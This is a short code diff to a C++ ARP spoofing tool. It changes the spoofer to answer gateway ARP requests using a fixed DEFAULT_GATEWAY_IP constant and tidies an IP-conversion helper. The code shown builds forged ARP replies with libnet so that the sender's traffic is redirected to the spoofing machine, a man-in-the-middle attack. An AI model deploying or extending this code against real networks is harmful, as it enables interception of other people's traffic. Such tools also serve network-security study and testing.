@@ -56,7 +56,7 @@ void ArpSpoofer::start_spoofing(char *interface, uint8_t* gateway) {
                 }
             }
 
-            if(macFlag && ipToInt(gateway) == ipToInt(arpHeader->target_ip)
+            if(macFlag && ipToInt(DEFAULT_GATEWAY_IP) == ipToInt(arpHeader->target_ip)
                && (my_ip != ipToInt(arpHeader->sender_ip))) {
                 cout << "Someone requesting gateway!!!" << endl;
 
@@ -65,7 +65,7 @@ void ArpSpoofer::start_spoofing(char *interface, uint8_t* gateway) {
                 arp = libnet_autobuild_arp(
                         ARPOP_REPLY,
                         my_mac->ether_addr_octet,
-                        gateway,
+                        DEFAULT_GATEWAY_IP,
                         arpHeader->sender_mac,
                         arpHeader->sender_ip,
                         libnet_context
@@ -122,6 +122,6 @@ const char *ArpSpoofer::ipToString(const uint8_t *ip) {
 }
 
 const uint32_t ArpSpoofer::ipToInt(const uint8_t *ip){
-    uint32_t res = (ip[3] << 24) | (ip [2] << 16) | (ip[1] << 8) | ip[0];
+    uint32_t res = (ip[3] << 24) | (ip[2] << 16) | (ip[1] << 8) | ip[0];
     return res;
 }
